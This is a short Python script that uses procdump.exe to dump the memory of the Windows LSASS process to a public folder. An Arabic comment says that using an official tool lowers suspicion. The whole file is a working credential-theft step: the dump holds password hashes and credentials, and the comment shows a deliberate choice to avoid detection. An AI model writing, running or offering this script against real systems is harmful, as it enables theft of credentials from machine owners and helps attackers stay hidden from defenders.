import subprocess
import os

def dump_lsass_live():
    # استخدام أداة رسمية بيبعد الشبهة شوية
    dump_path = "C:\\Users\\Public\\lsass.dmp"
    cmd = f"procdump.exe -ma lsass.exe {dump_path}"
    
    try:
        subprocess.run(cmd, shell=True)
        if os.path.exists(dump_path):
            print(f"[+] Done! File saved at {dump_path}")
    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == "__main__":
    dump_lsass_live()